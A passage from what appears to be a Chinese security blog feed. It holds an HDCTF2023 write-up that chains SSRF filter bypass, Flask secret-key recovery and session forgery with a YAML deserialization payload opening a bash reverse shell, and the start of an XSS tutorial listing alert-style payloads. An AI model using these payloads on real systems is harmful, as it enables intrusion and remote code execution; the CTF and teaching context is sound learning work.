src="https://s2.loli.net/2023/04/23/GRhokPMEr7q1J43.png" alt="image-20230423145412951"></p><p><a href="https://xz.aliyun.com/t/10579">Linux-Proc目录的利用</a></p><p>预期解：</p><p>我们进去发现了三个路由，但是第一个read路由可以读取指定url的内容，易知这是<code>SSRF</code></p><img src="https://s2.loli.net/2023/04/28/qzVHPOj3irdvxa6.png" alt="image-20230428111516922" style="zoom:33%;" /><p>我们点击 pwd，显示 <code>/app</code>，说明此时文件在<code>/app</code>目录下面</p><p>由于这是python写的题，我们很容易猜到文件名是 <code>app.py</code></p><p>于是我们想要使用file协议去读取 <code>/app/app.py</code>文件</p><p><img src="https://s2.loli.net/2023/04/28/PtMrf3R9VyAcXQj.png" alt="image-20230428111931565"></p><p>结果<code>app</code>被过滤了</p><p>这里我们可以将 <code>app</code>字段<strong>两次url编码绕过</strong></p><p><img src="https://s2.loli.net/2023/04/28/WiY31ZKDaSOPXTe.png" alt="image-20230428112210448"></p><p>获得源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><code class="hljs python"><br><span class="hljs-comment">#encoding:utf-8</span><br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> re, random, uuid<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> werkzeug.utils <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> yaml<br><span class="hljs-keyword">from</span> urllib.request <span class="hljs-keyword">import</span> urlopen<br>app = Flask(__name__)<br>random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br>app.debug = <span class="hljs-literal">False</span><br>BLACK_LIST=[<span class="hljs-string">&quot;yaml&quot;</span>,<span class="hljs-string">&quot;YAML&quot;</span>,<span class="hljs-string">&quot;YML&quot;</span>,<span class="hljs-string">&quot;yml&quot;</span>,<span class="hljs-string">&quot;yamiyami&quot;</span>]<br>app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="hljs-string">&quot;/app/uploads&quot;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    session[<span class="hljs-string">&#x27;passport&#x27;</span>] = <span class="hljs-string">&#x27;YamiYami&#x27;</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">    Welcome to HDCTF2023 &lt;a href=&quot;/read?url=https://baidu.com&quot;&gt;Read somethings&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Here is the challenge &lt;a href=&quot;/upload&quot;&gt;Upload file&lt;/a&gt;</span><br><span class="hljs-string">    &lt;br&gt;</span><br><span class="hljs-string">    Enjoy it &lt;a href=&quot;/pwd&quot;&gt;pwd&lt;/a&gt;</span><br><span class="hljs-string">    &#x27;&#x27;&#x27;</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/pwd&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">pwd</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">str</span>(pwdpath)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/read&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">try</span>:<br>        url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>        m = re.findall(<span class="hljs-string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)<br>        n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br>        <span class="hljs-keyword">if</span> m:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span><br>        <span class="hljs-keyword">if</span> n:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span><br>        res = urlopen(url)<br>        <span class="hljs-keyword">return</span> res.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-built_in">str</span>(ex))<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;no response&#x27;</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">allowed_file</span>(<span class="hljs-params">filename</span>):<br>   <span class="hljs-keyword">for</span> blackstr <span class="hljs-keyword">in</span> BLACK_LIST:<br>       <span class="hljs-keyword">if</span> blackstr <span class="hljs-keyword">in</span> filename:<br>           <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>   <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/upload&#x27;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">upload_file</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;file&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> request.files:<br>            flash(<span class="hljs-string">&#x27;No file part&#x27;</span>)<br>            <span class="hljs-keyword">return</span> redirect(request.url)<br>        file = request.files[<span class="hljs-string">&#x27;file&#x27;</span>]<br>        <span class="hljs-keyword">if</span> file.filename == <span class="hljs-string">&#x27;&#x27;</span>:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Empty file&quot;</span><br>        <span class="hljs-keyword">if</span> file <span class="hljs-keyword">and</span> allowed_file(file.filename):<br>            filename = secure_filename(file.filename)<br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(<span class="hljs-string">&#x27;./uploads/&#x27;</span>):<br>                os.makedirs(<span class="hljs-string">&#x27;./uploads/&#x27;</span>)<br>            file.save(os.path.join(app.config[<span class="hljs-string">&#x27;UPLOAD_FOLDER&#x27;</span>], filename))<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;upload successfully!&quot;</span><br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&quot;index.html&quot;</span>)<br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/boogipop&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;passport&quot;</span>)==<span class="hljs-string">&quot;Welcome To HDCTF2023&quot;</span>:<br>        LoadedFile=request.args.get(<span class="hljs-string">&quot;file&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(LoadedFile):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;file not exists&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(LoadedFile) <span class="hljs-keyword">as</span> f:<br>            yaml.full_load(f)<br>            f.close()<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;van you see&quot;</span><br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No Auth bro&quot;</span><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    pwdpath = os.popen(<span class="hljs-string">&quot;pwd&quot;</span>).read()<br>    app.run(<br>        debug=<span class="hljs-literal">False</span>,<br>        host=<span class="hljs-string">&quot;0.0.0.0&quot;</span><br>    )<br>    <span class="hljs-built_in">print</span>(app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>])<br><br></code></pre></td></tr></table></figure><p>我们阅读一下read路由的源码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">url = request.args.get(<span class="hljs-string">&#x27;url&#x27;</span>)<br>m = re.findall(<span class="hljs-string">&#x27;app.*&#x27;</span>, url, re.IGNORECASE)<br>n = re.findall(<span class="hljs-string">&#x27;flag&#x27;</span>, url, re.IGNORECASE)<br><span class="hljs-keyword">if</span> m:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;re.findall(&#x27;app.*&#x27;, url, re.IGNORECASE)&quot;</span><br><span class="hljs-keyword">if</span> n:<br><span class="hljs-keyword">return</span> <span class="hljs-string">&quot;re.findall(&#x27;flag&#x27;, url, re.IGNORECASE)&quot;</span><br>res = urlopen(url)<br><span class="hljs-keyword">return</span> res.read()<br></code></pre></td></tr></table></figure><p>我们发现获得的url会使用 <code>urlopen()</code>去读取指定url的内容，因此，我们可以url编码两次，第一次浏览器自动解码，然后获得被编码一次的url，这时可以绕过 <code>re.findall()</code>正则，<code>urlopen()</code>函数可以解析包含urlencode的网址，这样我们知道为什么可以两次编码绕过了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">random.seed(uuid.getnode())<br>app.config[<span class="hljs-string">&#x27;SECRET_KEY&#x27;</span>] = <span class="hljs-built_in">str</span>(random.random()*<span class="hljs-number">233</span>)<br></code></pre></td></tr></table></figure><p>这一段代码，<code>random.seed()</code>函数将会指定一个随机数种子，如果是固定值的话，会产生伪随机，每次固定位置的随机数都是一样的</p><blockquote><p><code>uuid.getnode()</code>函数用于获取网络接口的MAC地址。如果机器具有多个网络接口，则返回通用管理的MAC地址，而不是通过本地管理的MAC地址返回。管理的MAC地址保证是全局唯一的</p></blockquote><p><code>uuid.getnode()</code>可以用来获取网口的mac地址，因此是一个固定值，会生成伪随机，我们需要获取到mac地址</p><img src="https://s2.loli.net/2023/04/28/g9OC581ytisKUVb.png" alt="image-20230428113423797" style="zoom:33%;" /><p>我们可以使用：</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-regexp">/sys/</span><span class="hljs-keyword">class</span><span class="hljs-regexp">/net/</span>eth0/address<br></code></pre></td></tr></table></figure><p>获取 eth0 网卡的mac地址</p><img src="https://s2.loli.net/2023/04/28/KgwbrZAGf2TLnNk.png" alt="image-20230428113543582" style="zoom:33%;" /><p>这是16进制的值，于是我们可以使用脚本生成 <code>SECRET_KEY</code>的值了：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">import</span> uuid<br><br>random.seed(<span class="hljs-number">0x0242ac025164</span>)<br><span class="hljs-built_in">print</span>(random.random()*<span class="hljs-number">233</span>)<br><br><span class="hljs-comment"># 16.703189614984886</span><br></code></pre></td></tr></table></figure><p>得到key，我们可以使用 session伪造脚本伪造session了</p><p><img src="https://s2.loli.net/2023/04/28/DZgrlOKW5UNcuYe.png" alt="image-20230428113758500"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/boogipop&#x27;</span></span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">load</span>():<br>    <span class="hljs-keyword">if</span> session.get(<span class="hljs-string">&quot;passport&quot;</span>)==<span class="hljs-string">&quot;Welcome To HDCTF2023&quot;</span>:<br>        LoadedFile=request.args.get(<span class="hljs-string">&quot;file&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(LoadedFile):<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;file not exists&quot;</span><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(LoadedFile) <span class="hljs-keyword">as</span> f:<br>            yaml.full_load(f)<br>            f.close()<br></code></pre></td></tr></table></figure><p>这里主要利用 <code>boogipop</code>路由，<strong>yaml反序列化</strong></p><p>这个暂时不太会，直接放payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">!!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">str</span><br>    args: []<br>    state: !!python/<span class="hljs-built_in">tuple</span><br>      - <span class="hljs-string">&quot;__import__(&#x27;os&#x27;).system(&#x27;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/ip/port &lt;&amp;1\&quot;&#x27;)&quot;</span><br>      - !!python/<span class="hljs-built_in">object</span>/new:<span class="hljs-built_in">staticmethod</span><br>        args: []<br>        state:<br>          update: !!python/name:<span class="hljs-built_in">eval</span><br>          items: !!python/name:<span class="hljs-built_in">list</span><br></code></pre></td></tr></table></figure><p>我们将IP、port改为自己的，然后在服务器开启监听，上传这个文件，然后利用boogipop路由即可：</p><p><img src="https://s2.loli.net/2023/04/28/nQA2lsXBJGfk61V.png" alt="image-20230428114313417"></p><p>注意改一下session</p><p><img src="https://s2.loli.net/2023/04/28/hyZczEaUOAr6G3V.png" alt="image-20230428114353862"></p><p>在<code>/proc/1/environ</code> 发现flag</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>YamiYami</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>xss漏洞</title>
    <link href="/2023/08/24/xss%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/08/24/xss%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<p><img src="https://s2.loli.net/2022/12/17/1Rv7gKOSTMnrIhF.png" alt="1632124712_61483f283fe905f5232db"></p><h2 id="一、初识XSS"><a href="#一、初识XSS" class="headerlink" title="一、初识XSS"></a>一、初识XSS</h2><h3 id="1、什么是XSS"><a href="#1、什么是XSS" class="headerlink" title="1、什么是XSS"></a>1、什么是XSS</h3><p>XSS全称跨站脚本(Cross Site Scripting)，为避免与层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故缩写为XSS。这是一种将任意 Javascript 代码插入到其他Web用户页面里执行以达到攻击目的的漏洞。攻击者利用浏览器的动态展示数据功能，在HTML页面里嵌入恶意代码。当用户浏览改页时，这些潜入在HTML中的恶意代码会被执行，用户浏览器被攻击者控制，从而达到攻击者的特殊目的，如 cookie窃取等。</p><h3 id="2、XSS产生原因、漏洞原理"><a href="#2、XSS产生原因、漏洞原理" class="headerlink" title="2、XSS产生原因、漏洞原理"></a>2、XSS产生原因、漏洞原理</h3><p>形成XSS漏洞的主要原因是<strong>程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害。</strong></p><h3 id="3、XSS会造成那些危害？"><a href="#3、XSS会造成那些危害？" class="headerlink" title="3、XSS会造成那些危害？"></a>3、XSS会造成那些危害？</h3><p>攻击者通过Web应用程序发送恶意代码，一般以浏览器脚本的形式发送给不同的终端用户。当一个Web程序的用户输入点没有进行校验和编码，将很容易的导致XSS。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1</span>、网络钓鱼，包括获取各类用户账号<br><span class="hljs-number">2</span>、窃取用户cookies资料，从而获取用户隐私信息，或利用用户身份进一步对网站执行操作；<br><span class="hljs-number">3</span>、劫持用户（浏览器）会话，从而执行任意操作，例如非法转账、强制发表日志、电子邮件等<br><span class="hljs-number">4</span>、强制弹出广告页面、刷流量等<br><span class="hljs-number">5</span>、网页挂马；<br><span class="hljs-number">6</span>、进行恶意操作，如任意篡改页面信息、删除文章等<br><span class="hljs-number">7</span>、进行大量的客户端攻击，如ddos等<br><span class="hljs-number">8</span>、获取客户端信息，如用户的浏览历史、真实ip、开放端口等<br><span class="hljs-number">9</span>、控制受害者机器向其他网站发起攻击；<br><span class="hljs-number">10</span>、结合其他漏洞，如csrf，实施进步危害；<br><span class="hljs-number">11</span>、提升用户权限，包括进一步渗透网站<br><span class="hljs-number">12</span>、传播跨站脚本蠕虫等<br></code></pre></td></tr></table></figure><h3 id="4、XSS的防御"><a href="#4、XSS的防御" class="headerlink" title="4、XSS的防御"></a>4、XSS的防御</h3><p>形成XSS漏洞的主要原因是<strong>程序对输入和输出的控制不够严格，导致“精心构造”的脚本输入后，在输到前端时被浏览器当作有效代码解析执行从而产生危害。</strong></p><p>因此在XSS漏洞的防范上，一般会采用“对输入进行过滤”和“输出进行转义”的方式进行处理: 输入过滤：对输入进行过滤，不允许可能导致XSS攻击的字符输入; 输出转义：根据输出点的位置对输出到前端的内容进行适当转义;</p><h3 id="5、XSS常见出现的地方"><a href="#5、XSS常见出现的地方" class="headerlink" title="5、XSS常见出现的地方"></a>5、XSS常见出现的地方</h3><p>1、数据交互的地方</p><blockquote><p>get、post、cookies、headers</p><p>反馈与浏览</p><p>富文本编辑器</p><p>各类标签插入和自定义</p></blockquote><p>2、数据输出的地方</p><blockquote><p>用户资料</p><p>关键词、标签、说明</p><p>文件上传</p></blockquote><h3 id="6、XSS的分类"><a href="#6、XSS的分类" class="headerlink" title="6、XSS的分类"></a>6、XSS的分类</h3><h4 id="反射性XSS"><a href="#反射性XSS" class="headerlink" title="反射性XSS"></a>反射性XSS</h4><p>又称非持久型XSS，这种攻击方式往往具有一次性，只在用户单击时触发。跨站代码一般存在链接中，当受害者请求这样的链接时，跨站代码经过服务端反射回来，这类跨站的代码通常不存储服务端</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php">常见注入点:<br>网站的搜索栏、用户登录入口、输入表单等地方，常用来窃取客户端cookies或钓鱼欺骗。<br>漏洞产生原因一般是网站只是简单地将用户输入的数据直接或未经过完善的安全过滤就在浏览器中进行输岀，导致输岀的欻据中存在可被浏览器执行的代码数据<br>攻击方式<br>攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户。当目标用户访问该链接时，服务器接受该目标用户的请求并进行处理，然后服务器把带有XSS的代码发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后，就会触发XSS漏洞。<br><br>由于此种类型的跨站代码存在于URL中，所以黑客通常需要通过诱骗或加密变形等方式将存在恶意代码的链接发给用户，只有用户点击以后才能使得攻击成功实施。<br>反射型XSS攻击的流程如下：<br><br><span class="hljs-number">1</span>.攻击者寻找具有漏洞的网站<br><span class="hljs-number">2</span>.攻击者给用户发了一个带有恶意字符串的链接<br><span class="hljs-number">3</span>.用户点击了该链接<br><span class="hljs-number">4</span>.服务器返回HTML文档，此时该文档已经包含了那个恶意字符串<br><span class="hljs-number">5</span>.客户端执行了植入的恶意脚本，XSS攻击就发生<br></code></pre></td></tr></table></figure><h4 id="存储型XSS"><a href="#存储型XSS" class="headerlink" title="存储型XSS"></a>存储型XSS</h4><p>存储型XSS（ Stored xss Attacks），也是持久型XSS，比反射型XSS更具有威胁性。。攻击脚本将被永久的存放在目标服务器的数据库或文件中。这是利用起来最方便的跨站类型，跨站代码存储于服务端（比如数据库中）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php">常见注入点<br>论坛、博客、留言板、网站的留言、评论、日志等交互处。<br>造成漏洞原因一般是由于Web应用程序对用户输入数据的不严格，导致Web应用程序将黑客输入的恶意跨站攻击数据信息保存在服务端的数据库或其他文件形式中。<br>攻击方式<br>攻击者在发帖或留言的过程中，将恶意脚本连同正常信息一起注入到发布内容中。随着发布内容被服务器存储下来，恶意脚本也将永久的存放到服务器的后端存储器中。当其他用户浏览这个被注入了 <br>恶意脚本的帖子时，恶意脚本就会在用户的浏览器中得到执行。<br>存储型ⅩSS攻击的流程如下<br><span class="hljs-number">1</span>.用户提交了一条包含XSS代码的留言到数据库<br><span class="hljs-number">2</span>.当目标用户查询留言时，那些留言的内容会从服务器解析之后加载出来<br><span class="hljs-number">3</span>.浏览器发现有XSS代码，就当做正常的HTML和JS解析执行<br></code></pre></td></tr></table></figure><h4 id="DOM型XSS"><a href="#DOM型XSS" class="headerlink" title="DOM型XSS"></a>DOM型XSS</h4><p>DoM是文档对象模型（ Document Object Model）的缩写。它是HTML文档的对象表示，同时也是外部内容（例如 JavaScript）与HTML元素之间的接口。解析树的根节点是“ Document”对象。DOM（ Document object model），使用DOM能够使程序和脚本能够动态访问和更新文档的内容、结构和样式。</p><p>它是基于DoM文档对象的一种漏洞，并且DOM型XSS是基于JS上的，并不需要与服务器进行交互。</p><p>其通过修改页面DOM节点数据信息而形成的ⅩSS跨站脚本攻击。不同于反射型XSS和存储型XSS，基于DOM的XSS跨站脚本攻击往往需要针对具体的 Javascript DOM代码进行分析，并根据实际情况进行XSS跨站脚本攻击的利用。</p><p>一种基于DOM的跨站，这是客户端脚本本身解析不正确导致的安全问题</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs php">注入点<br>通过js脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所 <br>以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。<br>攻击方式<br>用户请求一个经过专门设计的URL，它由攻击者提供，而且其中包含XSS代码。服务器的响应不会以任何形式包含攻击者的脚本，当用户的浏览器处理这个响应时，DOM对象就会处理XSS代码，导致存 <br>在XSS漏洞。<br>它的流程是这样的：<br><span class="hljs-number">1</span>.攻击者寻找具有漏洞的网站<br><span class="hljs-number">2</span>.攻击者给用户发了一个带有恶意字符串的链接<br><span class="hljs-number">3</span>.用户点击了该链接<br><span class="hljs-number">4</span>.服务器返回HTML文档，但是该文档此时不包含那个恶意字符串<br><span class="hljs-number">5</span>.客户端执行了该HTML文档里的脚本，然后把恶意脚本植入了页面<br><span class="hljs-number">6</span>.客服端执行了植入的恶意脚本，XSS攻击就发生了<br></code></pre></td></tr></table></figure><p>反射型XSS与DOM型区别：</p><p>1、反射型XSS攻击中，服务器在返回HTML文档的时候，就已经包含了恶意的脚本;</p><p>2、DOM型ⅩSS攻击中，服务器在返回HTML文档的时候，是不包含恶意脚本的；恶意脚本是在其执行了非恶意脚本后，被注入到文档里的</p><p>通过JS脚本对对文档对象进行编辑，从而修改页面的元素。也就是说，客户端的脚本程序可以DOM动态修改页面的内容，从客户端获取DOM中的数据并在本地执行。由于DOM是在客户端修改节点的，所以基于DOM型的XSS漏洞不需要与服务器端交互，它只发生在客户端处理数据的阶段。</p><h3 id="7、常见标签"><a href="#7、常见标签" class="headerlink" title="7、常见标签"></a>7、常见标签</h3><h4 id="标签"><a href="#标签" class="headerlink" title="&lt;img&gt;标签"></a><code>&lt;img&gt;</code>标签</h4><h5 id="利用方式1"><a href="#利用方式1" class="headerlink" title="利用方式1"></a>利用方式1</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">javascript:alert(</span>&quot;<span class="hljs-attr">xss</span>&quot;)&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">IMG</span> <span class="hljs-attr">SRC</span>=<span class="hljs-string">javascript:alert(String.formCharCode(88,83,83))</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">scr</span>=<span class="hljs-string">&quot;URL&quot;</span><span class="hljs-attr">style</span>=<span class="hljs-string">&#x27;Xss:expression(alert(/xss));&#x27;</span></span><br></code></pre></td></tr></table></figure><blockquote><!--CSS标记xss--><p>img STYLE&#x3D;”background-image:url(javascript:alert(‘XSS’))”</p></blockquote><h5 id="XSS利用方式2"><a href="#XSS利用方式2" class="headerlink" title="XSS利用方式2"></a>XSS利用方式2</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;x&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">alert(1)</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">onerror</span>=<span class="hljs-string">eval(</span>&quot;<span class="hljs-attr">alert</span>(&#x27;<span class="hljs-attr">xss</span>&#x27;)&quot;)&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XSS利用方式3"><a href="#XSS利用方式3" class="headerlink" title="XSS利用方式3"></a>XSS利用方式3</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">img</span> <span class="hljs-attr">src</span>=<span class="hljs-string">1</span> <span class="hljs-attr">onmouseover</span>=<span class="hljs-string">alert(</span>&#x27;<span class="hljs-attr">xss</span>&#x27;)&gt;</span><br></code></pre></td></tr></table></figure><h4 id="标签-1"><a href="#标签-1" class="headerlink" title="&lt;a&gt;标签"></a><code>&lt;a&gt;</code>标签</h4><h5 id="标准格式"><a href="#标准格式" class="headerlink" title="标准格式"></a>标准格式</h5><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">&quot;https://www.baidu.com&quot;</span>&gt;</span>baidu<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><h5 id="XSS利用方式1"><a href="#XSS利用方式1" class="headerlink" title="XSS利用方式1"></a>XSS利用方式1</h5><blockquote><figure class="highlight html"><table><tr><td 